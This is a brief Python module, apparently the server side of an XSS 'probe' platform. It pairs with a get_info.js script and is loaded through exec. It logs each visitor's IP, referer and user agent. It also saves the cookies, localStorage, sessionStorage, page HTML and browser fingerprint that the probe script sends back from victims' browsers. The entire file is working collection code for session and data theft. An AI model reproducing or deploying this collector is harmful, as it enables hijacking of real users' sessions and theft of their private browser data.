#! /usr/bin/env python
# encoding=utf-8
#   quininer - 140502
#	get_info - base probe
#		and get_info.js
#
'''
with open('./static/serv/get_info.py') as files: exec files.read()
'''
serverinfo['referer'] = b64ens(request.headers.get('Referer'))
serverinfo['ctime'] = b64ens(ctime())
serverinfo['remote_addr'] = b64ens(request.environ.get('REMOTE_ADDR'))
serverinfo['x_forwarded_for'] = b64ens(request.headers.get('X-Forwarded-For'))
serverinfo['user_agent'] = b64ens(request.headers.get('User-Agent'))
serverinfo['accept_language'] = b64ens(request.headers.get('Accept-Language'))
serverinfo['x_requested_with'] = b64ens(request.headers.get('X-Requested-With'))

browserinfo['URL'] = b64ens(request.forms.get('url'))
browserinfo['cookie'] = b64ens(request.forms.get('cookie'))
browserinfo['localStorage'] = b64ens(request.forms.get('localStorage'))
browserinfo['sessionStorage'] = b64ens(request.forms.get('sessionStorage'))
browserinfo['browser'] = b64ens(request.forms.get('browser'))
browserinfo['user_agent'] = b64ens(request.forms.get('user_agent'))
browserinfo['screen'] = b64ens(request.forms.get('screen'))
browserinfo['istouch'] = b64ens(request.forms.get('istouch'))
browserinfo['referrer'] = b64ens(request.forms.get('referrer'))
browserinfo['os'] = b64ens(request.forms.get('os'))
browserinfo['date'] = b64ens(request.forms.get('date'))
browserinfo['plugins'] = b64ens(request.forms.get('plugins'))
browserinfo['websocket'] = b64ens(request.forms.get('websocket'))
browserinfo['java'] = b64ens(request.forms.get('java'))
browserinfo['page_html'] = b64ens(request.forms.get('page_html'))
